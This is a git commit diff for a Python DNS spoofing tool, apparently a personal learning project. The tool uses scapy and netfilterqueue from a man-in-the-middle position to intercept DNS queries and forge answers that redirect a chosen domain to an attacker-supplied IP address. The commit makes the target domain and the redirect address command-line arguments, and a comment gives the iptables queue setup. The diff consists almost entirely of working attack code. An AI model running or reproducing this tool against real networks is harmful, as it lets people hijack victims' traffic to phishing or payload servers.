dd3e3ad0954f261d4fb44666546709bf2c7f70ff
danericp <daneric.pelayo@gmail.com>
2023-11-23 13:35:30 -0500

    Update main.py

--- dns-spoofer/main.py
+++ dns-spoofer/main.py
@@ -1,5 +1,6 @@
 #!/usr/bin/env python
 
+import argparse
 import netfilterqueue
 from scapy.all import *
 
@@ -12,9 +13,9 @@ def do_packet_process(packet):
         ## Print Scapy object. Check the response
         print(obj_packet_scapy.show())
         str_qname = obj_packet_scapy[DNSQR].qname
-        if "www.bing.com" in str_qname.decode():
+        if obj_options.dns in str_qname.decode():
             print("Spoofing Target")
-            obj_answer = DNSRR(rrname=str_qname, rdata="192.168.1.6")
+            obj_answer = DNSRR(rrname=str_qname, rdata=obj_options.payload)
             ## Modify the DNS Packet
             obj_packet_scapy[DNS].an = obj_answer # DNS Record
             obj_packet_scapy[DNS].ancount = 1 # Corresponding number of DNS Record
@@ -30,10 +31,27 @@ def do_packet_process(packet):
     packet.accept()
     # packet.drop()
 
+def get_arguments():
+    obj_parser = argparse.ArgumentParser(
+        prog='DNS Spoofer',
+        description='Sends Payload via Target DNS input. MITM is required',
+        epilog='Tested with Parrot OS target'
+    )
+    obj_parser.add_argument("-d", "--domain-name", dest="dns", help="DNS (E.g. www.bing.com)", required=True)
+    obj_parser.add_argument("-p", "--payload", dest="payload", help="IPv4 Rerouting Address (E.g. 192.168.1.5)", required=True)
+    options = obj_parser.parse_args()
+    return options
+
 ## Create an iptables Queue
 # Terminal: iptables -I FORWARD -j NFQUEUE --queue-num 0 
 
-obj_queue = netfilterqueue.NetfilterQueue()
-## Bind this object/class to the Terminal iptables Queue
-obj_queue.bind(0, do_packet_process)
-obj_queue.run()
+## Try-Catch was used to enable keyboard exception handling
+try:
+    obj_options = get_arguments()
+    obj_queue = netfilterqueue.NetfilterQueue()
+    ## Bind this object/class to the Terminal iptables Queue
+    obj_queue.bind(0, do_packet_process)
+    obj_queue.run()
+except KeyboardInterrupt:
+    print("\n" + "☒ Detected KeyboardInterrupt... Goodbye")
+    exit()
